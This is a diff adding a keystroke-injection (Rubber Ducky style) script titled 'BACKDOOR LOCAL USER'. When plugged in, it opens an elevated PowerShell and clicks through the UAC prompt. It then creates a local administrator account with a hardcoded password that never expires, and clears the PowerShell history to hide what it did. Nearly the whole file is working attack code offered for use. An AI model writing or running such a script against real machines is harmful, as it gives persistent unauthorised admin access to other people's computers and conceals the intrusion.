@@ -1,0 +1,90 @@
+REM BACKDOOR LOCAL USER
+REM Add new user IS Add new user asd@123456 IS PASSWORD, CHANGE THOSE IF YOU WANT A DIFFERENT USERNAME AND PASSWORD
+REM ADMIN ACCOUNT CAN BE REMOVE BY USING Remove-LocalUser -Name "Add new user" IN POWERSHELL AS AN ADMIN
+
+DELAY 1000
+GUI R
+DELAY 300
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 400
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 100
+STRING $Username = "Add new user"
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING $Password = "asd@123456"
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING $group = "Administrators"
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+DELAY 300
+SHIFT ENTER
+DELAY 100
+STRING if ($existing -eq $null) {
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING Write-Host "Creating new local user $Username."
+DELAY 100
+SHIFT ENTER
+DELAY 100   
+STRING & NET USER $Username $Password /add /y /expires:never
+DELAY 100
+SHIFT ENTER
+DELAY 100   
+STRING Write-Host "Adding local user $Username to $group."
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING & NET LOCALGROUP $group $Username /add
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING }
+DELAY 50
+SHIFT ENTER
+DELAY 100
+STRING else {
+DELAY 50
+SHIFT ENTER
+DELAY 100
+STRING Write-Host "Setting password for existing local user $Username."
+DELAY 100
+SHIFT ENTER
+DELAY 100   
+STRING $existing.SetPassword($Password)
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING }
+DELAY 50
+SHIFT ENTER
+DELAY 100
+STRING Write-Host "Ensuring password for $Username never expires."
+DELAY 100
+SHIFT ENTER
+DELAY 100
+STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+DELAY 100
+ENTER
+DELAY 5000
+STRING Clear-History
+DELAY 150
+ENTER
+DELAY 100
+STRING exit
+DELAY 100
+ENTER
